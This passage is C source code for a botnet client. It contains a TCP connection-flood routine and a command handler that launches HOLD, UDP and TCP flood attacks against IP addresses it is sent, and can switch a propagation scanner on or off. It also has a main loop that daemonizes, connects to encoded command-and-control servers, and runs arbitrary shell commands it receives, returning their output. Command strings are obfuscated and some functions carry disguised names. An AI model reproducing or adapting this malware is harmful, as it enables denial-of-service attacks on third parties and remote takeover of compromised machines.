	if(getHost(ip, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct state_t
	{
		int fd;
		uint8_t state;
	} fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));

	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt, res;

	unsigned char *watwat = malloc(1024);
	memset(watwat, 0, 1024);

	int end = time(NULL) + end_time;
	while(end > time(NULL))
	{
		for(i = 0; i < max; i++)
		{
			switch(fds[i].state)
			{
			case 0:
				{
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
					else fds[i].state = 1;
				}
				break;

			case 1:
				{
					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
					if(res == 1)
					{
						lon = sizeof(int);
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt)
						{
							close(fds[i].fd);
							fds[i].state = 0;
						} else {
							fds[i].state = 2;
						}
					} else if(res == -1)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;

			case 2:
				{
					FD_ZERO(&myset);
					FD_SET(fds[i].fd, &myset);
					tv.tv_sec = 0;
					tv.tv_usec = 10000;
					res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
					if(res != 0)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
				}
				break;
			}
		}
	}
}

void processCmd(int argc, unsigned char *argv[])
{
    //PING
	if(!strcmp(argv[0], "Kfah"))
	{
        //PONG!
		sockprintf(mainCommSock, "K~ahN");
		return;
	}
    //Scanner
	if(!strcmp(argv[0], "4npaa-3"))
	{
		if(argc != 2)
		{
			return;
		}
        //Off
		if(!strcmp(argv[1], "~ii"))
		{
			if(scanPid == 0) return;

			kill(scanPid, 9);
			scanPid = 0;
		}
        //on
		if(!strcmp(argv[1], "~a"))
		{
			if(scanPid != 0) return;
			uint32_t parent;
			parent = fork();
			if (parent > 0) { scanPid = parent; return;}
			else if(parent == -1) return;
			Scanner();
			_exit(0);
		}
	}
    //HOLD
	if(!strcmp(argv[0], "g~cm"))
	{
		if(argc < 4 || atoi(decode(argv[2])) < 1 || atoi(decode(argv[2])) > 65535 || atoi(decode(argv[3])) < 1)
		{
			return;
		}

		unsigned char *ip = decode(argv[1]);
		int port = atoi(decode(argv[2]));
		int time = atoi(decode(argv[3]));
        if (winFork()) { return; }

        sendHold(ip, port, time);
        close(mainCommSock);

        _exit(0);
	}
    //UDP
	if(!strcmp(argv[0], "6mK"))
	{
		if(argc < 4 || atoi(decode(argv[2])) < 1 || atoi(decode(argv[2])) > 65535 || atoi(decode(argv[3])) < 1)
		{
			return;
		}

		unsigned char *ip = decode(argv[1]);
		int port = atoi(decode(argv[2]));
		int time = atoi(decode(argv[3]));
        if (winFork()) { return; }

        sendUDP(ip, port, time);
        close(mainCommSock);

        _exit(0);
	}
    //TCP
	if(!strcmp(argv[0], "5nK"))
	{
		if(argc < 4 || atoi(decode(argv[2])) < 1 || atoi(decode(argv[2])) > 65535 || atoi(decode(argv[3])) < 1)
		{
			return;
		}
		unsigned char *ip = decode(argv[1]);
		int port = atoi(decode(argv[2]));
		int time = atoi(decode(argv[3]));
        if (winFork()) { return; }

        sendTCP(ip, port, time);
        close(mainCommSock);

        _exit(0);
	}
    //STOP
	if(!strcmp(argv[0], "45~K"))
	{
		int killed = 0;
		unsigned long i;
		for (i = 0; i < numpids; i++) {
			if (pids[i] != 0 && pids[i] != getpid()) {
				kill(pids[i], 9);
				killed++;
			}
		}
	}
    //LOLNOGTFO
	if(!strcmp(argv[0], "c~ca~h5i~"))
	{
		exit(0);
	}
}

int initConnection()
{
	unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; } //if da sock initialized then close dat
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;
	strcpy(server, decode(commServer[currentServer]));
	int port = 80;

	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

	return 0;
}


int main(int argc, unsigned char *argv[])
{
	srand(time(NULL) ^ getpid());
	init_rand(time(NULL) ^ getpid());
	pid_t pid1;
	pid_t pid2;
	int status;
    //getOurIP();
	if (pid1 = fork()) {
			waitpid(pid1, &status, 0);
			exit(0);
	} else if (!pid1) {
			if (pid2 = fork()) {
					exit(0);
			} else if (!pid2) {
			} else {
			}
	} else {
	}
    

	setsid();
	chdir("/");

	signal(SIGPIPE, SIG_IGN);

	while(1)
	{
		if(initConnection()) { sleep(5); continue; }


		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
		{
			for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
				unsigned int *newpids, on;
				for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
				pids[on - 1] = 0;
				numpids--;
				newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
				for (on = 0; on < numpids; on++) newpids[on] = pids[on];
				free(pids);
				pids = newpids;
			}

			commBuf[got] = 0x00;

			fireWall(commBuf);

			if(strstr(commBuf, "Kfah") == commBuf)
			{
				sockprintf(mainCommSock, "K~ah");
				continue;
			}

			if(strstr(commBuf, "m6K") == commBuf) exit(0);

			unsigned char *message = commBuf;

			if(*message == 'N')
			{
				unsigned char *nickMask = message + 1;
				while(*nickMask != 'S' && *nickMask != 0x00) nickMask++;
				if(*nickMask == 0x00) continue;
				*(nickMask) = 0x00;
				nickMask = message + 1;

				message = message + strlen(nickMask) + 2;
				while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

				unsigned char *command = message;
				while(*message != 'S' && *message != 0x00) message++;
				*message = 0x00;
				message++;
				if(strcmp(command, "4g") == 0)
				{
					unsigned char buf[1024];
					int command;
					if (winFork()) continue;
					memset(buf, 0, 1024);
					szprintf(buf, "%s 2>&1", decode(message));
					command = fdpopen(buf, "r");
					while(SYSWOW64(buf, 1024, command) != NULL)
					{
						fireWall(buf);
						memset(buf, 0, 1024);
						sleep(1);
					}
					explorer(command);
					exit(0);
				}

				unsigned char *params[10];
				int paramsCount = 1;
				unsigned char *pch = strtok(message, "S");
				params[0] = command;

				while(pch)
				{
					if(*pch != '\n')
					{
						params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
						memset(params[paramsCount], 0, strlen(pch) + 1);
						strcpy(params[paramsCount], pch);
						paramsCount++;
					}
					pch = strtok(NULL, "S");
				}

				processCmd(paramsCount, params);

				if(paramsCount > 1)
				{
					int q = 1;
					for(q = 1; q < paramsCount; q++)
					{
						free(params[q]);
					}
				}
			}
		}
	}

	return 0; //dis is da propa codez

}
